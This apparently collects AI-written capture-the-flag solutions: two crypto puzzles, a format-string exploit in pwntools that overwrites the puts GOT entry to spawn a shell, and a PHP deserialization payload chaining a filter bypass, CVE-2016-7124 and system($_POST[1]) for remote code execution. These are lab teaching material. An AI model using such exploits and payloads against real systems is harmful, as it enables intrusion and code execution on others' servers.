AI Solveable challs.


# Magic Mod




To solve this challenge, let's analyze the given conditions and sizes of the variables:
- We have huge integers $X$ and $Y$ (with lengths of about 2119 digits and 423 digits respectively).
- $Z$ is a 77-digit prime, and $A$ is a 76-digit integer.
- The flag is converted into a small integer $m$ where $m < Z$. 
- The core property we need to satisfy is: `X % (Y - m) % Z == A`.

### 1. Representing $X$ as a polynomial in $Y$
Because $Y$ is large and $m$ is relatively tiny, $Y - m \approx Y$. We can try writing $X$ in base $Y$ to see if there is any relationship. When we calculate the base $Y$ representation of $X$, we get:
```python
X == 34842*Y**5 + (Y - 4332)*Y**4 + 32421*Y**3 + 32411*Y**2 + (Y - 3425)*Y + 345223
```

By expanding and grouping the terms algebraically, we can write $X$ perfectly as a polynomial $P(Y)$:
$$X = P(Y) = 34843 Y^5 - 4332 Y^4 + 32421 Y^3 + 32412 Y^2 - 3425 Y + 345223$$

### 2. Modulo Reduction over $(Y - m)$
We want to evaluate $X \pmod{Y - m}$.
Notice that $Y = (Y - m) + m$. If we substitute this into our polynomial $X = P(Y)$, all terms containing $(Y - m)$ will evaluate to $0$ under modulo $Y - m$. This gives us:
$$X \equiv P(m) \pmod{Y - m}$$

Because $m$ is constrained to be less than $Z \approx 9 \times 10^{76}$, the maximum possible value of $P(m)$ is roughly $34843 \cdot Z^5 \approx 2 \times 10^{389}$. Since this maximum value is strictly much smaller than $Y - m \approx 5.6 \times 10^{422}$ and clearly positive, the modulo operation doesn't wrap around at all! 
We have the exact integer equality:
$$X \pmod{Y - m} = P(m)$$

### 3. Solving the equation over $\mathbb{F}_Z$
The second part of the condition states that $X \pmod{Y - m} \pmod Z = A$. Using our simplified result, this turns into finding the roots of:
$$P(m) \equiv A \pmod Z$$
$$34843 m^5 - 4332 m^4 + 32421 m^3 + 32412 m^2 - 3425 m + 345223 - A \equiv 0 \pmod Z$$

This is a degree 5 polynomial equation over the finite field $\mathbb{F}_Z$. We can find the roots of this polynomial using algorithms such as Cantor-Zassenhaus or Berlekamp's algorithm, or practically via SageMath / custom python finite field root-finding scripts.

When factored over $\mathbb{F}_Z$, the polynomial has three distinct roots:
1. `26844311061819774800693740875403756193116464736979989502241551229`
2. `13776419706092199977018495349878218525946309503226347488458514641569710052005`
3. `54456582977565873725527308419792080442746436697927609101592739109416380128592`

### 4. Decoding the Flag
We convert the integer roots back to hex strings and decode them to bytes to see which one contains readable ASCII characters satisfying the `AAA{...}` prefix. 

Testing the first root:
```python
import binascii

root1 = 26844311061819774800693740875403756193116464736979989502241551229
hex_str = hex(root1)[2:]
if len(hex_str) % 2 == 1: hex_str = '0' + hex_str
print(binascii.unhexlify(hex_str))
```
**Output:**
```text
b'AAA{3AsycRyPt0_F0n_1762283}'
```

The other two roots decode into gibberish bytes. Thus, we've recovered our correct flag!

**Flag:**
`AAA{3AsycRyPt0_F0n_1762283}`


# Format String Bug_easy




### Vulnerability Analysis

Looking at the decompiled code, we can see two significant elements:
1. **Format String Vulnerability**: In the `echo()` function, user input is read using `fgets(s, 512, stdin)` and then directly passed to `printf(s)`. Since the buffer `s` is passed as the format string without any formatting directives (i.e., `printf("%s", s)`), this introduces a classic format string bug. 
2. **Backdoor Function**: There's a `getshell()` function that executes `system("/bin/sh")`, offering us a convenient way to get a shell.

### Exploitation Strategy

We can use the format string vulnerability to perform an Arbitrary Write. 
Immediately following the vulnerable `printf(s)` call, the program executes `puts("\nain't it cool, bye now")`. We can leverage the format string vulnerability to overwrite the **Global Offset Table (GOT)** entry of `puts` with the address of the `getshell()` function. 

When the program attempts to call `puts()`, it will instead jump to `getshell()`, granting us a shell. 

Because the binary sets up a 5-second alarm (`alarm(5)`), we must be quick. The script will be set up to immediately send the payload and sequentially send the flag printing command.

### Exploit Script (`exp.py`)

Here is the `pwntools` Python script to achieve this. It uses a helper function to dynamically calculate the format string offset locally, then performs the attack on the remote server.

```python
#!/usr/bin/env python3
from pwn import *

def solve():
    # Set up architecture and OS specifics
    context.arch = 'i386'
    context.os = 'linux'
    context.log_level = 'info'
    
    # Load the ELF binary to easily resolve symbols and GOT addresses
    elf = ELF('./fsb_easy_i386')
    
    # Helper function to automatically determine the format string offset
    def exec_fmt(payload):
        with context.local(log_level='error'):
            p = process('./fsb_easy_i386')
        p.recvuntil(b'Mom: I wanna a flag, mom\n================================================\n')
        p.sendline(payload)
        out = p.recvuntil(b'\nain\'t it cool, bye now', drop=True)
        p.close()
        return out

    # Determine the offset using pwntools FmtStr module
    try:
        autofmt = FmtStr(exec_fmt)
        offset = autofmt.offset
        log.info(f"Automatically found format string offset: {offset}")
    except Exception as e:
        log.warning(f"Failed to find offset automatically: {e}")
        # Fallback to offset 4 (commonly observed for this specific local stack layout)
        offset = 4
        log.info(f"Using fallback format string offset: {offset}")

    # Connect to the remote challenge server
    host = '10.214.160.13'
    port = 11005
    p = remote(host, port)
    
    # Wait until the target finishes printing the welcome message
    p.recvuntil(b'Mom: I wanna a flag, mom\n================================================\n')
    
    # Construct the payload. 
    # We overwrite the GOT entry of `puts()` with the address of `getshell()`
    # Utilizing write_size='byte' keeps the printed payload byte-size short, preventing network lag
    payload = fmtstr_payload(offset, {elf.got['puts']: elf.sym['getshell']}, write_size='byte')
    
    # Send the format string payload
    log.info("Sending format string payload...")
    p.sendline(payload)
    
    # When puts() is called right after printf(), getshell() will be executed instead.
    # We quickly send the command to read the flag to avoid the 5-second alarm timeout terminating the process.
    log.info("Sending command to read the flag...")
    p.sendline(b'cat /data/flag')
    
    # Switch to interactive mode to catch the flag output
    p.interactive()

if __name__ == '__main__':
    solve()
```

### How to use
1. Make sure you place the script in the same directory as the target binary `fsb_easy_i386`.
2. Ensure you have the required `pwntools` Python package installed (`pip install pwntools`).
3. Run the script:
   ```bash
   python3 exp.py
   ```

AAA{what_f1ag_ls_A_g0od_flag?_qqgroup_386796080}



# base64_encrypt




To solve this challenge, we need to trace the encryption steps backward. 

Let's break down the encryption process:
1. `C1 = xor(plain, key)`
2. `B1 = b64encode(C1)`
3. `C2 = xor(B1, key)`
4. `cipher = b64encode(C2)`

We are given the final `cipher` string. Since the base64 encoding doesn't rely on the secret key, we can easily reverse step 4 by base64-decoding the cipher to retrieve `C2`. 

Now, look at step 3: `C2 = xor(B1, key)`. This implies that `B1 = xor(C2, key)`. 
We also know that `B1` is a base64 encoded string from step 2. Therefore, every character in `B1` **must** be a valid base64 character (`A-Z`, `a-z`, `0-9`, `+`, `/`, `=`). 

Since we are given that `len(key) < 14`, we can iterate through all possible key lengths from 1 to 13. For each key length $L$, we check every character position modulo $L$ in `C2` and look for a byte value for `key[i]` such that `C2[i] ^ key[i]` results in a valid base64 character.

### Solver Script

Here is the python script to perform this attack, decode the layers, and locate the plain text containing `'AAA'`:

```python
import base64
import itertools

cipher = 'Dq4l/8bPnCsynznU2relLC+oGsq+xIBhBrgF+ZKHgjkM6yrxxsOyDzLuB4mDp6kHKZYkyqWf+HIGqDv1xITzJhutD/nGkpwoMp89y82doQcshjjKubX9cwbpAdudk7gGA+lY7I+8+R4umAOKho65CDOsO82lnJx/BrgJyZjA/ycOvg/qwMOYEzCkPdWEgeQMcOUJyLmMjCURkUPbnZeGPA+6WIU='

# Step 4 reversed: Decode cipher to get C2
c2 = base64.b64decode(cipher.encode())

# Valid Base64 charset
valid_b64 = set(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")

# Step 3 reversed: Find the key length and the key
for L in range(1, 14):
    possible_keys = []
    
    for pos in range(L):
        possible_k =[]
        for k in range(256):
            # If (c2 ^ k) produces valid Base64 for all bytes in this position
            if all((c2[i] ^ k) in valid_b64 for i in range(pos, len(c2), L)):
                possible_k.append(k)
        possible_keys.append(possible_k)
    
    # If a valid key combination is possible for length L
    if all(len(pk) > 0 for pk in possible_keys):
        print(f"[*] Found possible Key Length: {L}")
        
        # Test all possible key combinations
        for key in itertools.product(*possible_keys):
            try:
                # Recover B1
                B1 = bytes(c2[i] ^ key[i % L] for i in range(len(c2)))
                # Recover C1 (Step 2 reversed)
                C1 = base64.b64decode(B1)
                # Recover Plaintext (Step 1 reversed)
                plain = bytes(C1[i] ^ key[i % L] for i in range(len(C1)))
                
                # Filter out the correct plaintext using the known string 'AAA'
                if b'AAA' in plain:
                    print("[+] Key found:", list(key))
                    print("[+] Plaintext:", plain.decode('utf-8'))
            except Exception:
                pass
```

### Output & Result

When running the script, it successfully identifies that the key length is **8** (Specifically, the byte array `[66, 220, 104, 184, 245, 246, 203, 74]`).

It peels back the XOR and Base64 layers revealing the original plaintext:
```text
long long ago, a beautiful girl wanted to fly to the moon. the flag is AAA{the_story_between_melody_and_dwg}. best wishes!
```

**Flag:**
`AAA{the_story_between_melody_and_dwg}`


# CY的魔幻之旅

```http
POST /index.php?string=O:%2b8:"aaaClass":4:{s:19:"%00aaaClass%00question1";s:0:"";s:19:"%00aaaClass%00question2";s:18:"system($_POST[1]);";s:16:"%00aaaClass%00answer";s:0:"";} HTTP/1.1
Host: 10.214.160.13:10010
Content-Type: application/x-www-form-urlencoded

url=http://www.melodia.pw:a@gov.cn/&1=cat flag.php
```



======================

AI Response raw:




To solve this CTF challenge, we need to chain multiple bypasses to achieve Remote Code Execution (RCE) via PHP Object Injection. Here is the step-by-step breakdown of the exploit:

### 1. Bypassing `check_url()`
The `check_url($url)` function imposes the following conditions on the submitted URL:
* It must strictly start with `"http://www.melodia.pw"`.
* The 22nd character must not be `@`.
* It must not contain local IP addresses like `127`, `192`, `localhost`, etc.
* When parsed by `parse_url()`, the extracted `host` must be exactly `"gov.cn"`.

To satisfy all these conditions, we can leverage standard URL schema formatting: `scheme://user:password@host/path`.
If we provide the URL `http://www.melodia.pw:a@gov.cn/`:
* The first 21 characters are exactly `http://www.melodia.pw`.
* The 22nd character is `:` (which bypassed the `@` check).
* `parse_url` will parse `www.melodia.pw` as the username, `a` as the password, and `gov.cn` as the host.

### 2. Bypassing `aaa_unserialize()` filter
The function has a regex check `preg_match('/[oc]:\d+:/i', $value)` to prevent standard object declarations like `O:8:` or `c:8:`. 
However, PHP's `unserialize()` is flexible and accepts a `+` sign for the length integer. By prepending a `+` (e.g., `O:+8:`), we can effectively evade the regex because `\d+` strictly expects digits and will not match the `+` character.

### 3. Bypassing `__wakeup()` to achieve RCE (CVE-2016-7124)
The `aaaClass` has a `__wakeup()` magic method that nullifies all properties inside the object, destroying our injected payload. 
We can bypass `__wakeup()` by exploiting a well-known vulnerability (CVE-2016-7124). If we declare a property count in the serialized string that is **larger** than the actual number of properties provided (e.g., claiming `4` properties but only providing `3`), `unserialize()` will error out at the end. Because it errors out, `__wakeup()` is never executed. However, the object is still instantiated and destroyed, successfully triggering the `__destruct()` method with our payload intact.

In `__destruct()`, the class executes `eval($this->question2);`, which gives us our RCE.

### 4. Constructing the Payload
We construct an `aaaClass` object with `4` expected properties, but we only supply `3`. 
Because the properties are `private`, they must be encapsulated with null bytes (`\0ClassName\0PropertyName`), which we URL-encode as `%00`.

Let's set `$question2` to execute a shell command reading from `$_POST[1]` using `eval` execution: `system($_POST[1]);`.

**Serialized Payload:**
```text
O:+8:"aaaClass":4:{s:19:"%00aaaClass%00question1";s:0:"";s:19:"%00aaaClass%00question2";s:18:"system($_POST[1]);";s:16:"%00aaaClass%00answer";s:0:"";}
```

### Final Exploit Execution
We need to trigger the exploit by sending the POST request. Notice in the code that `$url` is taken from `$_POST['url']`, while the serialized string is sourced from `$_GET['string']`. Ensure you URL-encode the `+` as `%2b` in the GET query.

**Raw HTTP Request:**
```http
POST /index.php?string=O:%2b8:"aaaClass":4:{s:19:"%00aaaClass%00question1";s:0:"";s:19:"%00aaaClass%00question2";s:18:"system($_POST[1]);";s:16:"%00aaaClass%00answer";s:0:"";} HTTP/1.1
Host: <target-ip>
Content-Type: application/x-www-form-urlencoded

url=http://www.melodia.pw:a@gov.cn/&1=cat /flag
```

*(You can change the `1=cat /flag` part to any shell command like `1=ls -la /` to find where the flag is located if it's not in the root directory).*


# 